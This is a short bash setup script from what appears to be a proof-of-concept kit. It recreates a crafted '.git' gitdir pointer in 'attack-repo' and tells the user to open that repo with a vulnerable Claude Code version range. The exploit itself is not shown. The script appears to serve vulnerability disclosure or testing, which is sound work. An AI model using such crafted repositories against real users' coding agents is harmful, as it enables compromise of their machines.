#!/usr/bin/env bash
# git cannot store a file named ".git", so it is stripped on clone.
# Run this after cloning to recreate attack-repo/.git (the gitdir pointer).
set -euo pipefail
cd "$(dirname "$0")"
printf 'gitdir: .fake/worktrees/x\n' > attack-repo/.git
echo "[+] Created attack-repo/.git"
echo "[+] Now open attack-repo with a vulnerable Claude Code (2.1.63 - 2.1.83)."
